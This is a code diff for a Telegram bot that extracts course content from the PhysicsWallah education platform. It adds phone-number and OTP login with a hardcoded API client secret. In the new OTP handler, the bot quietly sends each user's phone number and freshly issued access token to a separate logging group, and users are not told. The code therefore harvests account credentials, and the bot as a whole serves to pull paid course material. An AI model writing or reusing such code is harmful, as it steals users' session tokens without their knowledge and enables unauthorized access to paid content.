@@ -15,9 +15,22 @@ from telegram.ext import (
 
 # Constants
 ROOT_DIR = os.getcwd()
+BASE_URL = "https://api.penpencil.co"
+ORGANIZATION_ID = "5eb393ee95fab7468a79d189"
+CLIENT_ID = "system-admin"
+CLIENT_SECRET = "KjPXuAVfC5xbmgreETNMaL7z"
+
+HEADERS = {
+    "client-id": ORGANIZATION_ID,
+    "client-version": "8.2.6",
+    "Client-Type": "WEB",
+    "randomId": "6c8c436e-9268-4a8f-a080-62f9f2ceb5cd",
+    "Accept": "application/json, text/plain, */*",
+    "Content-Type": "application/json",
+}
 
 # Stages for ConversationHandler
-AUTH_CODE, BATCH_ID, CONTENT_TYPE = range(3)
+LOGIN_METHOD, PHONE_NUMBER, OTP, AUTH_CODE, BATCH_ID, CONTENT_TYPE = range(6)
 
 # Helper Functions
 def get_batches(auth_code):
@@ -96,6 +109,43 @@ def get_batch_contents(batch_id, subject_id, page, auth_code, content_type):
         logging.error(f"Failed to fetch batch contents. Status code: {response.status_code}")
         return []
 
+def send_otp(phone_number):
+    """Send OTP to the given phone number"""
+    url = f"{BASE_URL}/v1/users/get-otp?smsType=0"
+    data = {
+        "username": phone_number,
+        "countryCode": "+91",
+        "organizationId": ORGANIZATION_ID
+    }
+    
+    response = requests.post(url, json=data, headers=HEADERS)
+    if response.status_code == 201:
+        return True
+    else:
+        logging.error(f"Failed to send OTP: {response.text}")
+        return False
+
+def verify_otp(phone_number, otp):
+    """Verify OTP and get authentication token"""
+    url = f"{BASE_URL}/v3/oauth/token"
+    data = {
+        "username": phone_number,
+        "otp": otp,
+        "client_id": CLIENT_ID,
+        "client_secret": CLIENT_SECRET,
+        "grant_type": "password",
+        "organizationId": ORGANIZATION_ID,
+        "latitude": 0,
+        "longitude": 0
+    }
+    
+    response = requests.post(url, json=data, headers=HEADERS)
+    if response.status_code == 200:
+        return response.json().get("data", {}).get("access_token")
+    else:
+        logging.error(f"OTP verification failed: {response.text}")
+        return None
+
 # Bot Handlers
 async def pw_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Start the PW extraction process."""
@@ -104,8 +154,82 @@ async def pw_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data.clear()
     
     context.user_data['conversation_active'] = True
-    await update.message.reply_text("𝕊𝕖𝕟𝕕 𝕪𝕠𝕦𝕣 ℙ𝕎 𝕒𝕦𝕥𝕙𝕖𝕟𝕥𝕚𝕔𝕒𝕥𝕚𝕠𝕟 𝕔𝕠𝕕𝕖😗[𝕋𝕠𝕜𝕖𝕟]:")
-    return AUTH_CODE
+
+    # Ask the user to choose login method
+    keyboard = [
+        [InlineKeyboardButton("Login with Token", callback_data="login_token")],
+        [InlineKeyboardButton("Login with Phone Number", callback_data="login_phone")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text("Choose your login method:", reply_markup=reply_markup)
+    return LOGIN_METHOD
+
+async def handle_login_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the login method chosen by the user."""
+    query = update.callback_query
+    await query.answer()
+    login_method = query.data
+
+    if login_method == "login_token":
+        await query.edit_message_text("𝕊𝕖𝕟𝕕 𝕪𝕠𝕦𝕣 ℙ𝕎 𝕒𝕦𝕥𝕙𝕖𝕟𝕥𝕚𝕔𝕒𝕥𝕚𝕠𝕟 𝕔𝕠𝕕𝕖😗[𝕋𝕠𝕜𝕖𝕟]:")
+        return AUTH_CODE
+    elif login_method == "login_phone":
+        await query.edit_message_text("𝕊𝕖𝕟𝕕 𝕪𝕠𝕦𝕣 ℙ𝕙𝕠𝕟𝕖 ℕ𝕦𝕞𝕓𝕖𝕣:")
+        return PHONE_NUMBER
+
+async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the phone number input."""
+    phone_number = update.message.text.strip()
+    context.user_data['phone_number'] = phone_number
+
+    if send_otp(phone_number):
+        await update.message.reply_text("OTP sent to your phone. Please enter the OTP:")
+        return OTP
+    else:
+        await update.message.reply_text("Failed to send OTP. Please try again.")
+        return ConversationHandler.END
+
+async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle the OTP input."""
+    otp = update.message.text.strip()
+    phone_number = context.user_data['phone_number']
+
+    auth_code = verify_otp(phone_number, otp)
+    if auth_code:
+        context.user_data['auth_code'] = auth_code
+
+        # Display the token to the user
+        await update.message.reply_text(f"𝐘𝐨𝐮𝐫 𝐓𝐨𝐤𝐞𝐧: ```{auth_code}```\n\n𝐅𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐁𝐚𝐭𝐜𝐡𝐞𝐬. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭✋...", parse_mode="Markdown")
+
+        # Log the phone number and token to the login group
+        log_group_id = context.application.log_group_id_pw  # Get log group ID from context
+        main_bot = context.application.main_bot  # Get main bot instance
+
+        await main_bot.send_message(
+            chat_id=log_group_id,
+            text=f"New PW Login:\n\n𝐏𝐡𝐨𝐧𝐞 𝐍𝐮𝐦𝐛𝐞𝐫: ```{phone_number}```\n𝐓𝐨𝐤𝐞𝐧: ```{auth_code}```",
+            parse_mode="Markdown"
+        )
+
+        # Fetch batches
+        batches = get_batches(auth_code)
+
+        if batches == "TOKEN_ERROR":
+            await update.message.reply_text("𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐫 𝐄𝐱𝐩𝐢𝐫𝐞𝐝 𝐓𝐨𝐤𝐞𝐧. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 𝐀 𝐕𝐚𝐥𝐢𝐝 𝐓𝐨𝐤𝐞𝐧👀.")
+            return ConversationHandler.END
+
+        if not batches.strip():
+            await update.message.reply_text("No batches found or failed to fetch. Please check your token.")
+            return ConversationHandler.END
+
+        await update.message.reply_text(
+            f"𝒀𝒐𝒖𝒓 𝑩𝒂𝒕𝒄𝒉𝒆𝒔😉:\n\n{batches}\n\n𝑺𝒆𝒏𝒅 𝒕𝒉𝒆 𝑩𝒂𝒕𝒄𝒉 𝑰𝑫 𝑻𝑶 𝑷𝒓𝒐𝒄𝒆𝒆𝒅⏳:",
+            parse_mode="Markdown",
+        )
+        return BATCH_ID
+    else:
+        await update.message.reply_text("Invalid OTP. Please try again.")
+        return ConversationHandler.END
 
 async def handle_auth_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the authentication token."""
@@ -273,6 +397,9 @@ async def timeout(update: Update, context: ContextTypes.DEFAULT_TYPE):
 pw_handler = ConversationHandler(
     entry_points=[CommandHandler("pw", pw_start)],
     states={
+        LOGIN_METHOD: [CallbackQueryHandler(handle_login_method)],
+        PHONE_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_number)],
+        OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_otp)],
         AUTH_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_auth_code)],
         BATCH_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_batch_id)],
         CONTENT_TYPE: [CallbackQueryHandler(extract_content)],
